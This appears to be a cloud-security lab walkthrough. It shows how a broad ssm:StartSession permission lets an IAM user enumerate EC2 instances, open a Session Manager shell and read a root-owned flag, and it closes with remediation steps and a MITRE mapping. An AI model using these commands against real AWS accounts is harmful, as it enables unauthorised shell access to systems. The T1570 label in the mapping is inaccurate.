# SSM Session Manager — Shell Access Without SSH

**Difficulty:** Intermediate | **Provider:** AWS | **Category:** Compute / Lateral Movement

## Scenario

An EC2 instance runs with the **SSM Agent** and an instance profile granting
`AmazonSSMManagedInstanceCore`. An IAM user has been granted `ssm:StartSession`
across all resources — enough to open an interactive shell on any SSM-managed
instance **without an SSH key, open inbound ports, or a bastion host**.

The flag is stored in `/root/flag.txt` on the target instance.

## Attack Path

```
[Attacker] ssm-attacker-<id> (ssm:StartSession + ec2:DescribeInstances)
    |
    v
aws ec2 describe-instances  -->  find the cumulonimbus target instance ID
    |
    v
aws ssm start-session --target <instance-id>  -->  interactive shell
    |
    v
sudo cat /root/flag.txt  -->  flag
```

### Prerequisites

Install the Session Manager plugin for the AWS CLI:
```bash
# Linux
curl "https://s3.amazonaws.com/session-manager-downloads/plugin/latest/ubuntu_64bit/session-manager-plugin.deb" -o /tmp/smp.deb
sudo dpkg -i /tmp/smp.deb
```

### Step 1 — Configure the attacker profile

```bash
aws configure --profile attacker   # region: eu-west-1
```

### Step 2 — Find the target instance

```bash
aws ec2 describe-instances \
  --profile attacker \
  --filters "Name=tag:app_id,Values=ssm_session_manager" \
  --query "Reservations[*].Instances[*].{ID:InstanceId,State:State.Name}" \
  --output table
```

### Step 3 — Open a shell

```bash
INSTANCE_ID="<instance_id>"

aws ssm start-session \
  --target "${INSTANCE_ID}" \
  --profile attacker \
  --region eu-west-1
```

Once connected:
```bash
sudo cat /root/flag.txt
```

## How to Fix in Production

1. **Scope `ssm:StartSession` to specific instance tags** using IAM conditions:
   ```json
   "Condition": {
     "StringLike": {"ssm:resourceTag/Environment": "dev"}
   }
   ```
2. **Use Session Manager logging** — send all session output to CloudWatch Logs or
   S3, and alert on `ssm:StartSession` events for production instances.
3. **Require MFA** for `ssm:StartSession` via an IAM policy condition:
   `"aws:MultiFactorAuthPresent": "true"`
4. **Enable AWS Config rule** `ec2-instance-no-public-ip` to reduce the attach
   surface — SSM works without a public IP, so there is no need to expose instances.

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Remote Services | T1021 |
| Valid Accounts: Cloud Accounts | T1078.004 |
| Command and Scripting Interpreter | T1059 |
| Lateral Movement | T1570 |
